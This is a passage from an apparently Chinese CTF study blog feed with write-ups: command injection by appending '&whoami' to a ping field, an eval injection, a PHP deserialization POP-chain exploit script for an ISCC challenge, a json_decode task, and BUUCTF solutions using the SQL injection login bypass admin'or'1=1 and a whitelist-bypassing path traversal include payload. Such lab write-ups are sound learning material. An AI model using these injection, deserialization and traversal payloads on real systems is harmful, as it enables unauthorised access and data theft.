title="二、exec “ping”"></a>二、exec “ping”</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301659965.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301700292.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301702635.png"></p><p>在后面加上 &amp;whoaimi  就可以执行whoami指令</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301701854.png"></p><h3 id="三、exec-“eval”"><a href="#三、exec-“eval”" class="headerlink" title="三、exec “eval”"></a>三、exec “eval”</h3><p>在上输入phpinfo();指令 得到回显，不局限于这个指令，你system(“ipconfig”)也能在上面回显出内容</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301734866.png"></p><h2 id="File-Inclusion（文件包含）"><a href="#File-Inclusion（文件包含）" class="headerlink" title="File Inclusion（文件包含）"></a>File Inclusion（文件包含）</h2>]]></content>
      
      
      
        <tags>
            
            <tag> WEB,十大常见漏洞,学习心得 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF里WEB题中的POP链</title>
      <link href="/2023/06/04/CTF%E9%87%8CWEB%E9%A2%98%E4%B8%AD%E7%9A%84POP%E9%93%BE/"/>
      <url>/2023/06/04/CTF%E9%87%8CWEB%E9%A2%98%E4%B8%AD%E7%9A%84POP%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<p>再解释源代码之前，我们需要先了解一下这个php的魔术方法</p><blockquote><ol><li>__construct()，类的构造函数</li><li>__destruct()，类的析构函数</li><li>__call()，在对象中调用一个不可访问方法时调用</li><li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li><li>__get()，获得一个类的成员变量时调用</li><li>__set()，设置一个类的成员变量时调用</li><li>__isset()，当对不可访问属性调用isset()或empty()时调用</li><li>__unset()，当对不可访问属性调用unset()时被调用。</li><li>__sleep()，执行serialize()时，先会调用这个函数</li><li>__wakeup()，执行unserialize()时，先会调用这个函数</li><li>__toString()，类被当成字符串时的回应方法</li><li>__invoke()，调用函数的方式调用一个对象时的回应方法</li><li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li><li>__clone()，当对象复制完成时调用</li><li>__autoload()，尝试加载未定义的类</li><li>__debugInfo()，打印所需调试信息</li></ol></blockquote><p>然后再来看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./xxxiscc.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">boy</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$like</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;能请你喝杯奶茶吗？&lt;br&gt;&quot;</span>;</span><br><span class="line">    @<span class="variable language_">$this</span>-&gt;like-&gt;<span class="title function_ invoke__">make_friends</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;拱火大法好&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;like-&gt;<span class="keyword">string</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">girl</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$boyname</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;我害羞羞&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;boyname-&gt;name); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span> = <span class="variable">$string</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;僚机上线&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;僚机不懈努力&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">love_story</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;爱情萌芽&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function(<span class="variable">$make</span>, <span class="variable">$colo</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$make</span>[<span class="number">0</span>] === <span class="string">&quot;girl_and_boy&quot;</span> &amp;&amp; <span class="variable">$colo</span> === <span class="string">&quot;fall_in_love&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;iscc&quot;</span>])) &#123;</span><br><span class="line">  <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;iscc&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当这个php代码开始走的时候，先是__destruct()魔术方法被触发，然后echo出句子，当进行到</p><p><strong>$this-&gt;like-&gt;make_friends();</strong>  发现它调用了一个make_friends方法，但是这个方法不存在，所以触发call()魔术方法，在__call()中,echo出句子后，进行**isset($this-&gt;boyname-&gt;name);**会发现其触发了____isset()魔术方法</p><p>因为我们可以从代码里看到这俩个属性都是私有的，不可访问。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922222.png"></p><p>那么我们继续走，当进行isset()魔术方法时，echo出它的句子，然后发现其**echo $this-&gt;name;**发现name前没加$，意思为name被当成字符串，所以会发现其触发__toString()魔术方法</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922283.png" alt="image-20230514203653686"></p><p>echo出句子，然后进行<strong>return $this-&gt;like-&gt;string;</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922390.png" alt="image-20230514203808378"></p><p>string是类helper里的成员变量。所以触发了__get()魔术方法。echo出句子后</p><p>   $var &#x3D; $this-&gt;$name;<br>    $var 【$name](); 从当前对象实例中获取一个变量，使用$name变量中指定的变量名称。然后，它尝试调用检索到的变量上的方法，使用相同的$name值作为方法名。（还是有点不太清楚）然后就是往下走类。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922316.png"></p><p>满足$colo强等于”fall_in_love”,且数组[0]&#x3D;”girl_and_boy”;</p><p>所以就可以构建出一个链表并以此来写出PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$like</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">girl</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boyname</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>=<span class="keyword">array</span>(<span class="string">&quot;string&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title function_ invoke__">love_story</span>(),<span class="string">&quot;love&quot;</span>));</span><br><span class="line">    &#125;<span class="comment">//这是一个公共函数构造器（__construct），它需要一个字符串作为参数。在函数内部，将传入的字符串赋值给类的属性 $this-&gt;string。其中包含一个名为 &quot;string&quot; 的属性，它是一个数组，该数组包含了一个新的 love_story 对象和一个字符串 &quot;love&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">love_story</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fall_in_love</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;girl_and_boy&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上半部分就是将类进行书写。以及满足love_story类中的条件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">boy</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">boy</span>();</span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">new</span> <span class="title function_ invoke__">girl</span>();</span><br><span class="line"><span class="variable">$h1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="variable">$l</span> = <span class="keyword">new</span> <span class="title function_ invoke__">love_story</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;<span class="keyword">string</span>=<span class="keyword">array</span>(<span class="string">&quot;string&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title function_ invoke__">love_story</span>(),<span class="string">&quot;love&quot;</span>));</span><br><span class="line"><span class="variable">$b</span>-&gt;like=<span class="variable">$h</span>;</span><br><span class="line"><span class="variable">$h1</span>-&gt;name=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$g</span>-&gt;boyname=<span class="variable">$h1</span>;</span><br><span class="line"><span class="variable">$b1</span>-&gt;like=<span class="variable">$g</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b1</span>);</span><br></pre></td></tr></table></figure><p>下半函数就是我们的链表，也就是上面我所说的按照那个顺序一步一步走，最后到达</p><p>$h-&gt;string&#x3D;array(“string”&#x3D;&gt;array(new love_story(),”love”)); 然后get传参iscc&#x3D;序列化后的结果，得到线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300923309.png"></p><p>从这些被echo的句子也能看出链表。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB POP链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php中json_decode函数</title>
      <link href="/2023/05/31/php%E4%B8%ADjson-decode%E5%87%BD%E6%95%B0/"/>
      <url>/2023/05/31/php%E4%B8%ADjson-decode%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="JSON函数"><a href="#JSON函数" class="headerlink" title="JSON函数"></a>JSON函数</h2><h3 id="json-decode函数"><a href="#json-decode函数" class="headerlink" title="json_decode函数"></a>json_decode函数</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202305311939562.png"></p><p>JSON 字符串 ：</p><p>JSON 中的字符串必须用双引号包围。</p><p>例如       {“ctf”:”play”}    俩字符串用:隔开</p><p>JSON 数字 ：</p><p>JSON 中的数字必须是整数或浮点数。</p><p>例如        {“ctf”:100}</p><p>在 JSON 中，值必须是以下数据类型之一：字符串，数字，对象(json对象)，数组，布尔，null</p><p>不可以为以下数据类型之一： 函数，日期，undefined</p><h3 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h3><p>在PHP中   json_decode() 函数用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量。</p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="variable">$json</span> = <span class="string">&#x27;&#123;&quot;ctfer&quot;:&quot;sanmao&quot;,&quot;ctf&quot;:&quot;misc&quot;,&quot;age&quot;:18,&quot;bisai&quot;:14,&quot;champion&quot;:5&#125;&#x27;</span>;`</span><br><span class="line"></span><br><span class="line">`<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>));`</span><br><span class="line">`<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>));`</span><br><span class="line">`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>实例演示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202305311948136.png"></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h3 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[[SWPUCTF 2021 新生赛] jicao]"></a>[[SWPUCTF 2021 新生赛] jicao]</h3><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本题需要进行一个post传参，一个get传参，post传参很简单，在Max HackBar或者在BP里传入 id&#x3D;wllmNB</p><p>但是get传参则需要通过调用 PHP 内置函数 json_decode()，将字符串解析为一个关联数组，第二个参数 true 表示将解析结果以数组形式返回。最终将解析得到的数组赋值给变量 $json，可以在后续的代码中使用。</p><p>即构造 url+&#x2F;?json&#x3D;{“x”:”wllm”}   即上面所学json对字符串的值</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202305311954553.png"></p><p>即可得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> php基础，代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUWeb刷题记录</title>
      <link href="/2023/04/23/BUUWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/04/23/BUUWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><h3 id="一、本题做题思路"><a href="#一、本题做题思路" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>本题打开后是一个登录网站，结合题目所给提示，考虑应该是SQL注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231457412.png"></p><p> 看一下源代码，发现是get传参，和要加上check.php</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231459936.png"></p><p> 判断下闭合方式,发现是‘闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231502368.png"></p><p> 结合其为登录页面，尝试一下万能密码得到flag。</p><blockquote><p>payload：url+&#x2F;check.php?username&#x3D;1&amp;password&#x3D;admin’or’1&#x3D;1</p></blockquote><p> 也可以选择直接在页面的用户名和密码上输入admin’or’1&#x3D;1。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231510964.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点"><a href="#二、本题知识点" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p> <strong>万能密码</strong>   可以看这位大佬的博客：<a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">大佬博客</a></p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><h3 id="一、本题做题思路-1"><a href="#一、本题做题思路-1" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>页面就是一个简单撸猫画面，所以查看源代码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041722891.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041722721.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>在查看源代码时拉到最下面，发现一串代码审计内容，所以通过修改payload得到flag</p><blockquote><p>payload: url+&#x2F;?cat&#x3D;dog </p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041723676.png"></p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><h3 id="一、本题做题思路-2"><a href="#一、本题做题思路-2" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开以后就是一个滑稽笑脸，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041723660.png"></p><p>通过查看源代码找到线索，去线索里看一看</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724631.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现还有一个线索可以去<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724597.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 进入这个php得到线索，返回source.php进行代码审计</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//定义了白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//判断 当page存在或者page是字符串时，返回true</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//白名单过滤,需要传入的page中由source.php或者hint.php</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//mb_substr() 函数返回字符串的一部分,返回到0到mb_strpos的内容。</span></span><br><span class="line">            <span class="comment">//mb_strpos() 查找字符串在另一个字符串中首次出现的位置</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//查看page是否存在在白名单里面</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="comment">//对page进行一次decode解码 </span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//与上面一样，查看俩个?之间的内容</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//查看是否存在白名单</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 所以构造payload，得到flag</p><blockquote><p>payload: url+&#x2F;?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725779.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="ACTF2020-新生赛-Include"><a 